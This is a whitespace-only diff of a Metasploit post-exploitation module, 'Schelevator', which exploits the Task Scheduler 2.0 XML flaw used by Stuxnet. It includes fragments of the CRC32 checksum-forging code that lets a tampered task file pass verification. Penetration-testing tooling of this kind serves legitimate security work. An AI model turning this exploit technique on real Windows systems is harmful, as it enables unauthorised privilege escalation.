@@ -19,7 +19,7 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 			'Name'          => 'Schelevator',
-			'Description'   => %q{ 
+			'Description'   => %q{
 				This module exploits the Task Scheduler 2.0 XML 0day exploited by Stuxnet.
 				NOTE: Thanks to webDEViL for the information about disable/enable.
 			},
@@ -324,7 +324,7 @@ class Metasploit3 < Msf::Post
 
 		crc = crc32(data[0, data.length - 12])
 		data[-12, 4] = [crc].pack('V')
-		
+
 		data[-12, 12].unpack('C*').reverse.each { |b|
 			old_crc = ((old_crc << 8) ^ bwd_table[old_crc >> 24] ^ b) & 0xffffffff
 		}
